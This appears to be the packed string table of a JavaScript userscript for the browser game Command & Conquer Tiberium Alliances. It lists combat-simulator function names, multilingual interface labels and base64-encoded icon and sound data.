IoiqIoChAasgoAyAAAEEBRFMdxHMmRHMmxHAsIDVkFAAABAAgAAKBIiqRIjuRIkiRZkiVZkiVZkuaJqizLsizLsizLMhAasgoASAAAUFEMRXEUBwgNWQUAZAAACKA4iqVYiqVoiueIjgiEhqwCAIAAAAQAABA0Q1M8R5REz1RV17Zt27Zt27Zt27Zt27ZtW5ZlGQgNWQUAQAAAENJpZqkGiDADGQZCQ1YBAAgAAIARijDEgNCQVQAAQAAAgBhKDqIJrTnfnOOgWQ6aSrE5HZxItXmSm4q5Oeecc87J5pwxzjnnnKKcWQyaCa0555zEoFkKmgmtOeecJ7F50JoqrTnnnHHO6WCcEcY555wmrXmQmo21OeecBa1pjppLsTnnnEi5eVKbS7U555xzzjnnnHPOOeec6sXpHJwTzjnnnKi9uZab0MU555xPxunenBDOOeecc84555xzzjnnnCA0ZBUAAAQAQBCGjWHcKQjS52ggRhFiGjLpQffoMAkag5xC6tHoaKSUOggllXFSSicIDVkFAAACAEAIIYUUUkghhRRSSCGFFGKIIYYYcsopp6CCSiqpqKKMMssss8wyyyyzzDrsrLMOOwwxxBBDK63EUlNtNdZYa|ByERTlYEIMnQegghA9CuJqDrDkIIYQkNUhQgwY56ByEwiwoioLEMLgWhAQ1KIyC5DDI1IMLQoiag0k1|pavmCombatViewerDefender|u00e4yksen|setDomLeft|U4|target|viewChangeHandler|unitType|startSimulation|ogg|RadioButton|Bouton|Sald|tacs_version||String|initializeOptions|backgroundColor|info|122|Used|lukitus|repairUnit|horizontal|Wheel|Audio|red|blue||www|freesfx|Air2|Feet|vehicles|CombatVictoryPopup|buttonId|toggleRepairMode|u00e9bloquer|unitId|air|courtesy|Sblocca|vertical|8RA3ZvcmJpcx0AAABYaXBoLk9yZyBsaWJWb3JiaXMgSSAyMDA3MDYyMgEAAAAhAAAAQ09NTUVOVFM9aHR0cDovL3d3dy5mcmVlc2Z4LmNvLnVrAQV2b3JiaXMiQkNWAQBAAAAkcxgqRqVzFoQQGkJQGeMcQs5r7BlCTBGCHDJMW8slc5AhpKBCiFsogdCQVQAAQAAAh0F4FISKQQghhCU9WJKDJz0IIYSIOXgUhGlBCCGEEEIIIYQQQgghhEU5aJKDJ0EIHYTjMDgMg|video|u011fmesinin|black|u00e9e|Count|value|120|Crystal|Z5qqqqquK8u|end|u0131m|Onar|freigeben|Track|abs|b6qq67quLMuy8Juq6rquK8uy7Qur68qyLNu2bhvD6rqyLMu2bevKceu6rvu|Palauta|YhWUqQH|LAeR5g53HtsnSDCMZcipie6mLflMtIHVCee8h77z1MeMKUivkS132NaXf6S2ugI|5UWK7xoWVQ2Kivt1zS7Jaua4ewVNzzhmu7tTcLMJCinDpBo1eMqLAzb09MnTHFx4yxYwxyKRIaPl23|q5JEgAAAAASUVORK5CYII|Rg6MDGlHwdYVqnP|QUQBDHwYDTm9ZufyaeDQ3JrGN|Ixvbe2w88yN49W|8d75v94QuHOqW3Oz2s9|unexpected|7tZV4w2ViJ3LTl1MWNRup9mczrFizrDSSSxyFo75AhNZ3if|Z3uu7gtUkRO1GxftJvXfAgwA2h5U|8X3P3|kVRlHyTk5Hpvr45eGkq2u18Jvji3G4ZalqJNn2V2jaFwcBKRW02yKzIPbbSjz6SIRhFXbW1ArI6rEm|EJLTu9TWFhpra9Puhv4n5o68POvi6KgXCUrh8BUcOZK|x2c0JamoyY|e01xcYLeaExG3Ifxnk9rPHXbtqRH3nijADb6OYcoDCEioM6ESAjJGzbEoGNlQK30iKGysKDYYmbywNWra5HhrniPJ9Fgsbh5KZdOibo4MuJCu46FHgzNDw6OaY3TOez3z7q3b89EEoa4jU8pJalZlptYy7cBj0DZdpG4kMhoWyqdY|ctKTUlgYZ4yNdXJOOFlSk|get_ArmyUnits|OzF8fp8fR|KisromqAsr7ULEDVRaqNXUuavr7n|pavmCombatAttacker|RepairChargeBase|89trf0dozNh07ts2ckEB7jUZWSq8QtTfUcSeL5cTKAHL9U1NZ|19x9qimpqb|PkNjSdOpMwODExqu1rUVuwB46b4eLnw5Zfz0AnTpnt65q|fX1GQiJday1dZEWFisZd23c6MgqL7dgcxLr3rFDzQM79hQxNHMY|iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAB3RJTUUH3QMQFzoqkrYqRAAAAB1pVFh0Q29tbWVudAAAAAAAQ3JlYXRlZCB3aXRoIEdJTVBkLmUHAAAGrUlEQVRYw52WyY9c1RXGf|get_OwnerAllianceId|dvfiRIL9TlbOese84EODkZ6r|fr3qIrAlWvX|PhF3Z5fJebH30kNarOOVnrdrh3OKTbTCnqSPCe1b01eivr5I0EQH0x4|ezuPf7x19eYjE7I0hQABRLrOB4OmU1HNFsdEUStEeoQpDg85NiqLAzgg6fbacnOek8|uSIVNpy5cpVfXg8ltHREaPjQ1QEVUjTlOYGfLp|BsxGl9WTeIrxFIX9dr4ZNuD8KH77Li9O008oswqAAVlcirxa7tDl6FYR5EFy75x8Pn37pTEdHDR3BjOeU|SendSimpleCommand|GetPublicAllianceInfo|3mypPL3bPrdp6qupt78|BNaogItHr7TsPdCDHZk18XBhgf3|fQVpx|YYdBqXPiMFwqtPpROrZhG6rxXA0QSTiAyTOYW9Bv7|KzmpfrD49znFnkn1VMeWndjtgN6ELMmPLxWPxsHg|kpxCjyTb53jzj|Jmr664Xa6cHspRDn|zy57vfdo87CyB0t176xcsv|yQhqtCZUHkTEGBAiUQURQVVI04zJbIogIIIxQFQ9GM30sIpmOdU7r|Rp576hl88KBz|t18Km6TEJpYFbsqqvJuJa6L699crTZR5LELi8kk|7LwgDLvT6XrzwneWOFrc0GIiI|fkavUv5iTLxfDQCWqFkJvXRalkpHMNTTXIb4zqvr|4Mum7n|get_CityFaction|v175Li6VR4ArDx3bhgM9tMxqYUF4wHVjGqq2Sy|4aqrqG7qgd6wm2MjYnBKFFIskAifwASipRlttlHkSJlkb8iUnYRy6yyyzKgDEgBJYRJcUAYhGkPZWx6qK7pDffek0W1CSB6Uf2WT|jPn|Oa3v|tT3d1|t53zvedI5zx|q5z64IW|uDfiwOIIFHRNGvI8soKeSPXaEQ67Q4mCs4YQowYa3HWIVmOtykbq6vqux2ZFgXLvb5WdSWDT|i6efuc5sfEJZVXRXepJ88J7e|icon_mode_repair_active|VMVPN1QAstWuEhB987tOm0snSr8YZW8tO4KwDvc|88CjGu4CNgIPvk|akamaihd|eaassets|f7X|O3PmBkgYNKoYuvvNNwL0I4s1xUq5ILLIpACrey9cyODYK8YtDoch76mnQkwiwnkp4bn4iy|Qbfhtd|net|b7TEz933WmMj|K0IgD0TQbKyOaEg72X4UF3vtVJWrJ6O7KzJVZftig9ZIrV4UmWbpfFhrgk8z9m|GetLootFromCurrentCity|VkDAyCVK|205|sYLnn59VjdN5fng4gFK3czkaRe5u1qHr15O1sbempASTcnOpXH6mrEUZXUQVTAtK1B4kgcQs05BwcvNaIBn3FBWNx6xaZVZJ|zvln39el1VRMaEhIYNEGNUSAxIlGG|DBBSYhsyckzMZ66aWX9mO8GcgHkrlfkPzeB3rT9u7tXbtnj6B6gMpv8No1HROOVwlYiM29GzdcUjAYXFY2g0GPTO|https|jcBW7g3dai48cHkTcChykcmJub6Th9Oo1s8aQNKoFEZKxzor3drnV7weHDM2WffHI39|1buCher0tu5|37BVHe3SWtUU7sRqoLu2lrTd0eOFGGcDazh92e57skrzbEOx09|NDQzI8nTqznMDhZQwSRjVMVeG6|rKo57krC2sRvlGt2RRd9ocVcPY|Pcsy33BrDRPRLoe2xsseQq4dOohoHKp9VUFiE6xqm7sePH3f4zauchfVZlLw5RAIWGzvTXsU14RXHk8Vdr67hIuMa5kOEdWfod5psQb17w9Kn0zsT9kK1gpwBM5u5lW9sMf0IHYECvLLZYehl6t5H52pARNwgoIZpLG9t|d6sV|d75cf9c68c248256dfb416d8b7a86037|vbZ599iJPsgZlnV1bqK0|WKBREQOQSKwD|158|0l9Xt|1E4|CalculateDistance|cncalliancesgame|m8kcpq4cASrIWoIGA5Pvh4LlzzX|askWvEbLw|t39ELHGsj8nu6zrbXoAAOqmXms8|iRekfR4|SrA2YBggYzaehOe3y5fXtbz1VvbYL7|131|EuAQVLYlfvdpyqKGhyZKU9D3GP3G1hEV2v5Hr2vxjVVXaSsbpp|CYmxqe6upI46Q3icov9z|PMiG0js9vOTeNy|Value|1vP|simulation|Ma0c9260cScnKXJzk6VhNxWXZ2W9|Furq0db3n47j7rscEtLWAoEvBzKgD0jw2RLTZ3iJA0a|0Gs3nr7jffpEw3DTc2upZmZ3tU43Eej8XmcpEtn6qElLHzKZs3jyHzRbXUUBFL|get_CityUnitsData|DiplkejXEEmQdXxc1l1dd26Z54JgYislhpI|GetUnit_Obj||nITaCFnEFBDQpP13Z2AsJqiFOKvcKnL3vyNiqvX2lD0R7uFWBPENEdtFP6B6kJAC64aTUDdQXFBP2Iab1u0w3HCl2v6sFQ1Ne50qaqrcPoZsW9V7Iiuvh3LAdTCBbfNoX94vpjNc6YBVSyyerKYWNVbeT89u|ResMain|Res|vrrBdkVFeSRVk7qgEpAWd|4YORTKRDueRE6oM16eOf3f||eyy7yqqvFH6ZqQUVqqQ22noQF5kRNkKAAyS0ONjf1Qv2nVOGZuhDo6INW3Me6nsBKBCPdnKzxg7fz667yQzxdiEhI8YkEHs6ds2iSr6wZNP1d7vyV9|ST2fDCfRaZUQ0J5Sj58EPqhnvQiFATYaXUqJxvvvdeB8K6vuPLL|rxmmymSUlJu4D5IWwvqqqShUjJ|LugcviVAJwnRRcXExCP|0wn6vWlXWfPimScPkh949eTJ|eF7bWFAVJkisIzY5WY3XIntCOco|bNmzdv1nSlqB3TBbyyOcZXKDY3oJ9gaZb8cFovwjWF1|KLLy5DjOaYhFLnEUkKdZ45E|Structure|GetCommandPointCount|rTq5|uez4yje6n|SW3W9NTl7kjjbImd76aE1Nfc5jj82AREStc5AIdp89a6g7dqwkigR9zwfjfjz|QLsW4F22qxe1LTlKXtWZLgHjQAdwu|1VcPYLydNcXJRmhuIc1aIQB5X|7EhuX4ILW02g5XWTg|GetUnitMaxHealthByLevel|LDzbETboqzh5MnBJFP8K95spIek6SITvfPWVrDeb9|17910bNx8SuFgYDGo8sMQeIbuygS96kx9|Offense|d84ATMOsg9YDp1cvrJYDUH|elHzjwA8bXOS|CWLePr6JsiACn6J1qwnStqgUxx02QflETNAsx595eTkWOMvX9|ZbDYzjCUM1Nc7SGSUOpek4GBDQ5x|6N7y8OkGQZ33n2Ou3|forum|tK9Up|7QiSN8uNKr9yofhdH0LKqS0yHM85j65neuIvH42z4lqO7oTUc8wq2gdMUDtsJACo4x1f6TiemHXGm|NMM6t6PMj6eZPJ3OWBGwHoyDa|ForumOverlay|myBexisk2y9htRL|HusPwDaxKN2a8OrGcfdX57fyaVmpOuaMTLnGB|w1gnyQIQxcq4yvAGzANXjMhf2WyqmuWrZTkGPNInLoCHrjG3QjIi0fo0aIT9gpFXZaQY6Kww|Vsf97bo57D3OFvkRlXKjdgDsQMdoOJE1H9yduOZYooYGAKpSMz75mYm8uB4zEq2Dt5kRGV||AllianceOverlay||fXCmg79sqZe8YcqpOnuqp8HC7HrmGedlemGBJbZqJKk1G0wL4mdlHgYdZAWF75f9dDvKrxeRzrrvo4SCbvZK5|WFwd3HZcVbAjnGmz1IRxr|v7IH|mail|MailOverlay|BJknEtwOem8wF8V|CW3njiIuDxAzG0oDLecN1vgud28||gwWsyRl|alliance|ResearchOverlay|C67xPwTQ|VLoe93zn3HPuPZ3LZTTCMDSg43teRsZ9XDaD1SLkvwvAKIFT4DqoJEUiKwFN8A5sB|pegIyjOw1c9oWAPRO01tZyeP6ZFRblm8f35f8y3cEr2qe|fB0jgRXo|hdjEMeQM8BE|HdOK6q6mrd5Sa|wtbSxFqyJiEeEeGS0kU4YY3qobt3lO|BRgAhgJgQiBnZrUAAAAASUVORK5CYII|iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAx9JREFUeNq8l8uPDFEUxvtWV8|o7hmPTCeeC4bJYIhHIhZYiNjZ2CEidlYWHrEwEyxn7x|BCXAWlKNE|InventoryOverlay|3ZCQmsRErUyGIxNQhiXibayfIbAR06Sj5nYJEQiR|F2Cb6CKUlOmwN|xJqvBRcZrk807DtrOcTnkvnv6ZlxRA3QW8OKmGc5PoLxVlwEilyfYRr3nVAv57274A54xYkbEdHZA06DbUy|ehIog54ybK9RaBFFUAPHwKxEwU8wLnV8lWGuMdR5tcba|0BAjoqeXEJ3JZ7VoRJ4bFMvgMcB7s5mUzccpbSOE7puQ0jJblxDtyHgHaiABiXUG4CZ8B|N0mFi55UABLwDAY4GO5N8LnOT6vglFwEnwBNzDHgjG|08Kk8ZKREmMbwU4wAVaBNfKKhBgsA21i5|monetization|fiwvhX0Vv5DwKq7rUkoavDo5KREbLDJ|ReportsOverlay|PK9qoi2gL6oOqL2tYyHno6J2JI4i3szvQuYwxXTVZ31aTku9p95FPOwaNltdXTN6Fa|RestartReplay|VKxeArQ22AKrz4Y|get_BattleDuration|5E3|vxchLBJAtS9E|PointOfInterestTypes|3lSfPZUYjdf8aHgG8Yz|7l7|2E3|yobmf88fJyK455hg5blpDS7KaLPHLvIgMY2Q1WT01PY21hbF9nea4OT789e2aMeKffFm|280|349|rPrdv6mL|175|230|THXMddeTaW8UXv|180|dhWfzqt8Jswq1z1L|WM5TsNz3A2bUd1PP8ZPAQYA6tkaX3nBq4MAAAAASUVORK5CYII|GetTotalBonusByType|837vUHuFFlJqBFASUVgYBiZtgJjXZqsXvNgSrXu|275|p2c5f|YWD7N8E2TPzysmRwK0PAAzYTpHnbuiSQsgAlQt35YeEkfKzxLsyG2lXHvPazya4z4CaKCrALQuABfA2MGYe3BdS0xAta7V7|0CJwHrjE4hKwGe8jSkp4G6LvI0LKZpMHsR0KTnniOizjIcS9M79CKgwUOnwKy3R|dTwNgoFAX|lfprJlIjU71oBeWZ0nSWTU5tILa33|zJ8Z|DefenseBonus|VEYZ4cUvtDJgJmmQcF5b1dhhc81db1Oxk9tXHMsZevOEsQ8JnkwlFZpn6K8Jw|t2xGava86Ga|70aA|DoStep|eBecFhtvxL|CTAR|225|EPOIType|ZgrWdZQjUH42D3bbzqQTwlHvGtmmEZVeioAl2xHW24|I1sD3vGPHvGAoI39PO|DjSdUGheq99e3x2yXFUVYitt9JbdTud2AD6yAtXlceOF56itqOXrqTIcH8wPiuf43cfTu8prh|rr4upQ4RNKqqytzzc8u12m12LlwAjWzuPk7mBHE5BqUoC|a2d|n7BzcWB9CoTKZTTdqVxLrSMih1VUmdJIQwbyprDUVRUhY1vi6YemFlKcdXM4xGQlRGowne|8UXEmtFG3mGiqhJUvLUMRrPqOpIkiQ4ZxExrPTWuHrtOls7j|9w4P73PzwBuvbewzu3MJZQ9Lo4AxUVcHNGykPvjg8RxOKsLq6Tqu|8z5Zd5XaRxILFy89SavZJEYFnU|PFwdHiAHne4MUXX6S50sfXnuADxlpUIyIGRIlRWFlZ5yc|CalculateAttackCommandPointCostToCoord|RkhKkYUBOo6Yq3B1zW72x1ufP5gcYAQPDf|get_DefenseOffsetY|PEE22CL2ZUviTNLVkmjxaEBUugqoqKsVY1ICFUgoimaSpiDBrt6T6sxAhZo0O328e4jCxJKUtDVQnHRw5|3hj1e77VaMihhrJMRA9IEkTbDOgJ6OX4SoEdVTHAHvoa4hM8JnD88ex|8DigFIoHwdTR8AAAAASUVORK5CYII|get_MinYPosition|Dwc1hpgymTcywkxfDDX|cPB|OM9ctiveaa|nhzwQU3HutBMU6N1Qae|rdPJidRHD9m4uIlNvrqUA7S5uPv0l|HM3GwnQ65s03Xmdra4OTaQRfkjc7EEtqhAd3b|2dazxiM73PPjhj7yfmaUGPEe49GwVpLmrYQMYgREpPgnKOqCibjMc4IdVQSY0AMtZaU0xnWpUi05wgiZB4lNsVRMZmM2bv4JK1mTohxPoYFJuMRDwYDqnpGHR0mVNisgcRARFgJGyTnATBG6PdXSVoroJ6g0GzkgOBsAsxrniQpS60l2qZJ4SHRGnUNEiucnAzJckfgHEHkfc3b77xLo9Oh9DVBLZcuXuLypSe|0uY7Xm8GRKb7nNxb0ncM59zZdBA6N6xGQ2owzleZpQeOyxTda2tyhKT|KE6aTg8XnlSdMmT5nArAzIqSXlVGpVJXNNLrQvsLXR4tX03cUB6qrivbffonh|6hN1wh4JKL7b97MLnYWarKvd0Zb46VOjjj0E7lfJbH3Pyp2j0bQpia|v6RmsI5csCQ5znd7jLOOjJnUQzGCM4ZxqMReaMF6gFzOph0HiCn6lgMSI3IORQQI5RlyeDuHUbTgmaWkmeOW7dv0|GUdiPBpQ3EGKJGjDUQ5z7QRyByqoZy|get_Simulation|14Vdpcyfv3Cs9w6OMIIjGZTru3t8tqfP14cIIaazwcD0mkAjYSqIIrBWWG5t8HO5hrhW8z1w16HH6cwrUr2R|fwjTEF1eIARiydTgfTzIkhYJs51lmSJKXT7lD7uSLGyP9LospoBqOZUIVIWVg6zT6ZSc8EMGeXQIhRcdahGKxzCEKr1SHLskc3oqqIKqgiIlgrWAtGFCXiYySoLq4AMVBWFVQFo|CWMgz3N6nRbT6YyD4ZjhwV12n7zOD777LNaYufynEEaEUXHEjcMP|cvwU|fXn2Vx7gf3WK|dIwhA4PDpiVBRMixJjLWVZ0e32OCom|DCX3sfI2uraly74ZpbUKFHDOZIwKjFGfFCQZJ4HydxuW5s71CHQWlrCWIM1BplvY6jO|T1lWaFRUFPMViKhKK|jTUV2XdAczbuv88Ex3BvMbsTgB|98W4mJyfN2CerlS3SAOhd50AO4oGbNh|ceil|GrPZDFXFWkdRlVxOHNY|iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAzdJREFUeNq8ll2ITGEYx|edj901i2UNaaiVyFdK3PgohUJSyo3ykVsXeyFy7|EpEn6|nclOBpzAbifCn6sU|OvAUXtMZwImcVSt4FXumA47LRO6BiJqdhpW8Cq38mzcDhh|OQ4Du0pIimlIxOlAF|ggUsaiZ0L2ABEdvOsrAsA9nQgtISLjN9CK6BebS6RiEVitwIutruBVoEDhFxnIvoy3gllimUkvwAbOf4dTpQowuLWPSKof0AB5QZvAPPcF3pqLa3REqge3StpigzPTk|5WUAIfjyb0C3iv6LvxTinlDPqULnL0UoNWg386hPEvqfEecOsfUZRi8Rke|KMTkdaf8sQIYvvPBfTHg58H9zkqrfFT6eIzWALWMxZV5UI4RPYC16Bx7qope2CQhEXafdusJIDD|3aobJV6|AXfALnCA|vHNxXcVRWy4pf0yB3g6s6z4Iyo4C7XQ4bOxJYCcXUDv|yCu6oDW20bSmOYPZSbreym66o4C5TM0ZhsTggu|9TXwJe6AX4V0sWUQqy7CnlMxwAC|lfhuKu2LuqiakO|ranking|sAUs5Y|DrfkRqQCaP18cBB8ZDvvWg7MkBaeW7cXtQOG3ZTMrB|gOBhu2gksq5qr|oxWA2SfZzq8DLzlLx7J|RankingOverlay|ZPP1pUbDcYQd2|ucy1sB8MyrhBIuxF2AeOgUOgRCEVDtYMcKeXC1dm|gClaA5QxcBqO8Fn7hvTGcXVAXp|CombatSetup|5HkLHyPhucAdvAGAV2B6RHjmGKk|get_VisAreaComplete|857nfUwi5PA8T05GLo0xiTiO5DjBe8BaMIDfZsoEMHg32Akug00gNZUOSLD14CQYAu9BMw4B6YDZi9WrwGnQC56A161bf9Lg6Xcmsz7SAcHz4BTIge|NOElfkjpBy5Yoil5S4EclolfK5YwfL7JwzX8f|SetPosition|af5Hj9eZs2P3nD3165yZc877|gLfgKd0qiiAI8ToSwOAzwVFwGPxgzvUAnvXbv29IimI|g0fgNiiAWpgjvgB5eR|3b8HBE|HH7ycenVdD1gpiZiAaqcfcp7dR|event|cdn|XZn1FSYRSJABH|tL9PKoOA2TXXWgqZxnEvgrrjUTkRSnXO03Jtg8AaFO2CEv0|AI6CPLrcVUANXwXUwS|GetFormationByTargetBaseId|rCMZarDFf|8a1uBbX4vpUTMZxjOubHhlTHkRI7iDMNZsHKMYIYR4|Uli3Ezbhou0BszP7Zt4LNrdFupm6waPnA6TNeej5i7eacm37ExGrxVo0RjzvIJhS4HIWRQZ1cA4LLtJegM0b0HzvSe|odGSUGSYptnddz2e7XGrntxR7e0DxjoeU|OWf5kH|fvAV8fP|rzz|Z1Dhlw1vviJ|Y3lh9asmN|rEtOrGKwfalgLAQ5kwMAGpzJWE8bzT0nZE0CJhoKp6XvL41gd6uqpyi0u7Zy94Kf78jCl5PGburOn5MyZXLASAYttl|ahHSzwL65ZPWNNQV|ECjgwJ84lISDZSgIxF8lJGTiA3EQW5ywDJkLicEizLl4QXnxvt2Lx4rNTycqG0c4pPrAEALyIWVMyuwHiSQshUBkQkBymp9pJl1V5xGRHufJdZ5kh77ZIlotNZ2|9AmSw1XZpIj5kxIm4EAcSRFTE2F4hs|ee8|SfPNm39hi8LmkjYN2AJjBnvJLMn|8TlfCCo0f7j3b8NXLr4q6fwmTlHTzY3VRBJXpUzplAun1T93sU9LdkTFyzlJvwE7LcCpBRn|bYt7sLdn|yrv9EfUa1t27o1917qbXDi0Xzm|27At|JCiIvzmLYBYwfSSMB|Hysll2t7zfbWw3guLMLybIJUMxkY5yJ0FxrYhd0eZHCkJUgwlG2smw9b3lgEH622aH5zEaxdNg9ww3MzGl4wJo9FFDzhWrH8VqB4K9fj4wyAGgwS1xPs1P6AsRbFPweAS0gIof94EiaoCQkDI00rBxRldWoOibFuuXSSuhCCRLAS2pFA6jbkzxuIH1EQnb83ogHG0DoKq5RBSh|B2OddVrlyx6fb5j4fMvEj|uZmg9LXix8eCyIR0meogBjUhJ6|owE0xPjbiq0gU6UeOIAYSTxnhWaP|5jpGFbRpchOQTDlLvkBAH1E8nRE9RXikWMcIsxe4gzhlIFGTG0hffSr2UxmwTdrA1NoPO4NKeOrtfr|C5CDgcTuhZs4McDqz0kuAZM5AQtcLqkqKpKenlQH||fL1aWFMPur4|2tMS7Dl5ak332XNhdTCg5U2s3DDztYbY9cMHsksmPhadWf6IO1cWx3GBcxFzB98CiP|XZOye40QQwOdxr8bOsaI5c1t||GeCdg52nA9|u9x5puuLth9|v2esKXu4tzyurOK9Hw|Kpkrw|kokFn|Wzn2KJatEZ1fxcQHpu28ZzmrY|DJ7956Z|9Gb|Z5vrsYVXEi59ulMyrk05mGtLcDpxcpbzw6l371WEQCEDZVhAAWRjsgZmMjo36pBuFAPvsumvbf7U|zzkFQFeGB7xLTR2UdqcdvS7Ah7dnDx3cPnp0NUDnMsxADDySVMhyXvB1pdQM|o6dk|aFXR7ymgCn8oX|PT|8NFLUzseybpZKDZLvNkbjF6W6tQPbjNpFiPEhAPqmu|06T3fMKBcLNdGixkgrkBuBJLzmXvlkOLuwcG089nudBuA1z|7xNN5peBVOJqTEFhzEH6WwBf52uH929KCgCtAHQqYgbNwKOewoQFcL3SetDShv|pZR3Z5KqrnuAayula4kY4gjHsLtmi7PVIOlZissD6QTn7IFP9m2fXMyifPdAmgLEjLwsIu42UG4WgqWykHYKjSCxcE|8HQSHg722Fl|kxl850HAXPB1I|0ehDXqXIkxbhECKgBFPOFZDD2qNQHOl2hbzff3C4BWSHOZAe8axqG4SyH9OwBF8xo16h8YpsZik34eSLnHLQsvZwfcKy2G6h4bdW8Blun|tT7lkvFZtuGqhNuRj0qAN0eKIfjtyoAmx1EUKikNno6VKwXCe4CGRubR3sO6kcmBGQ8j4XdVcBzhXDQ3v71dHpKgMCsKsQXQsgabG2kfmbRf8uI94Ephu5bPp4GIM7oYLCVAypSx3Qh|f0W0euC4CFCMwMDMC2gCAAbEtAyMz01YJ|ULzLhhT8pz4l17K|ywKetxRcHMqkvtAIdycTON8FgFAA1ArAw4pApFg4UMnh8TTwckD|0CD4GwDP7Mm0AXj529jlLwQEEDAkgVIgEzAaiJ0YDiIgMUa10EVfuiAPVWgNHRM7EEzvef2PX9lmQagfwmGUBICtiBFaoonlDRGCIvg|IEXvEg5FiI0a|6P609VRf8|RmrKcVp5yUPdmO|8xoJulqIpLVrCqr2bxlYVlWs0qLIZTVjHu6mp34vbLFcWLxyA|TUkZ4wAAAABJRU5ErkJggg|iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAFfUlEQVR4Xu2Va2wUVRTHz9zZme6zpbQVSgxU21r64hUSUIkPFFPhCx|ZmfmzvXcnWWxBaoy|kFTEkkhYwNYX4ICFRoTFEKomhIajBICRNSgSifrBWHpaAChUhPFtqIVKUAm63y86|CmXKRerKYHLs|VoEfxnJiNiyxPKgTlIFMTWL5onKhLhOmJZZzV2P5D2Uee7oPcrKYUMHXRhYTKgRcikurJV4tJdOxqh|7nxx74iddbKw3CzBluQgELfrdscpiXjlRkvOtZD9gODevoxaagtwYiE|yTGCih6re0GG1eSTo3Ov7ny00RbgzZM|sKWoZxvmHvwJzQUd64cyCXm1hvDcRnDYRlD7uIYsowhyRgWN6W9mf2bneJ6QjT2yshobloAuiBEWoQIRIgq0oViyo3nRYjKIkRmPSkeFykeFiXkDUoxihS3RIpBpLguUrwIQGWR4rJIsRYp5k5mNC55YDVAZzNCMaOWmBGJGbXEjO5rMhUxo|ruBLZWUW8IoL0da7HjQOw4FDu|ySSCUAsAmgTyYiZQSJZ3QJuWgpKEsnyGqExKa3uRigdk1Cak1DKfwmlZCODhNIGI9aBqSahdCGMQX3CxqCbsVw6AMO|zxaUxI7rYscrH94YQOdAQhJIGmBMKIEkL4FkiVH5Ekia|bpYkgRdFCZjQdzOEBCGiUaAiTe4Jg1IQBCGYMQOMMeoQCZ5W0yGVbS4AWRjRceoqXOoPWKlH|LMwPw8CIaVhWt3mGr5chAhElqTOY1sbmh7UQHKd|Z0DROO0P6YhNg|TpAqws2vWm5wVALnSpwF1lO2UHMfaGR1pf|a4x33cfJr1|x15GquSUOxqhQ0jt9wqMtpU4KdG9h3Mhts0lBKZTK1xXantpCKSODQcCY710LDdSrxjMxkOwgUKbzRbbqT4|zXz3IItA0Ezj|iVBORw0KGgoAAAANSUhEUgAAAEAAAACgCAMAAACL85puAAAAn1BMVEX|GomcePMQKcuH9HSx6fv70T0KzcLgY6GqkAAAAAElFTkSuQmCC|0hYucTrUVrzHeC3UNjBnF|EGdm3VdTewbvac5LYb2HB|MYFk37TtVxgrBZw6O9WEEoJl1BC|6a1aC1ai9Z3rSC3cFpfzJPYUB4lSOQQWmuQfxAdJwhA|Ng0VwsY9NGKQ|JHWrQWrfv2YtH9b58gfdDlXiNRR6EjUSOB9P96|14Caw8ZDZJYzG3LAnh1QnS3LWZ0lLirNT8t9mvRWrQWrQ281uH9aK1B|BkaIG29gx7O75QYm9mvxLCNau|obVmj3dfSFINIQn6nhL8Coe7XXlfl35N0FEa9E6fBCrtdz7eg0niBw9ey6LQoejxhWkPcQwEijLgnMDQ6HFHiJ2PtFatBatRettJBr|c3Nzr6|vw8PDT09PFxcXp6enV1dWdnpro6Ojt7e2en5v29vb39|kImqr7xL8kCk1enXsUjyUKTUae1dDgVU|cM2|T4MyVSj8ZsvnGv|wYIaM0DyssE0AEd0EGGO|Aqj9CAMxpwQgOuzQNOeAAdnM1XuVUFn7N5QKtKB8MLSFAHiYlELpJ9wajZE9mVl9YtjSWLDnrkzqCl8XswZAd0QAd0QAd0MLrIz5UdiQ7M6|12wMgNiLyCSBzH6zUwst1stsj8AK74lmQgdGoWAAAAAElFTkSuQmCC|YD9YEAO6IAO6GDy8oGdUGTP79gRx2qxcNAZyVOapgVyyFJGv4yBU5puPj8c7l34MU83m|7MOQ1a9A18d||ea3qv9z9bYuQE0XyAXswDuJ3FA2XPgkJEHkFEQSRSjZDBAxQED7hCHTzgARhyqz3|kpaOdnpvs7OyhoZ7g4ODOzs7Q0NDX19eam5ecnZq9vb3CwsK6urrGxsbv7|fq6uqhop|Hx8fy8vKPkIyTlJC2tLGSk5DLy8ubnJiWl5TR0dGdnpwbfqafoJzZ2dna2trIyMj19fXd3d3e3t74|Pj5|||voyWnv7AAAAAXRSTlMAQObYZgAAAR9JREFUeF7tmkduxTAMREnJvf|fn6|9LtMI|qiTY8HCQkRDJoO6yR2W|8bfqbc3Nyhop|iVBORw0KGgoAAAANSUhEUgAAAFoAAACgCAMAAAC7f4tPAAABklBMVEUAAAD|OeihXxgLfsQAAAABJRU5ErkJggg|T09PZ2dnY2Njx8fHy8vLz8|Oen5t2d3XW1tZyc3C5ubnJycnLy8ugoZ6hoZ7X19bX19eKioiXmJTa2tqXmJXg4ODh4eHi4uLr6|Pq6uqen52LjIrK09eMjIvOzs3Q0NC3t7e4uLiRko9qa2iWl5NtbmsbfqZ0dHK9vr3b29t2dnTf39|ucnZmcnZqdnpr09PTR0dHS0tLV1dV0dXPj4|Uf9|vtCITCT95rFoKVjruNKeEhMTk|oUvQFlRLuBrUP9BKyjRuGZnCcBAkcEEHRIgA4GYbmUlblAwdAoqAgxjUe9GGE2Z1p5gGGPLAEWRIDcgDDUQRWF2x0A6IyGNgj9h|RFrvbk4b7JMIKzqIACDmGECReI6hXEFeZCb7ZoUjcUn8YyFonEIhpTpAPBgBtBB8oQLaUa65DhZKK1Syk2lDagYQCmD|Tas0rRngM8ipNMhH5KYgBmwRPixTBENAezfQgMyN8D|t8rSfgYUfehMHGCCapjJDKi6AQ4igpYyxPcLiRupDFD7BpjJQIkl|ztAlCQMADSm8UzID2wgx|O90GRIUi6MwRQxNTwKSAxivCkaAmAIwhJo2M2AyJuuJBBxp3Tc8xtpcKPB7ekxIbpOb|IyMifoJygoZ3CwsLo6Ojp6enDw8Pu7u7w8PCGh4OIiYewsL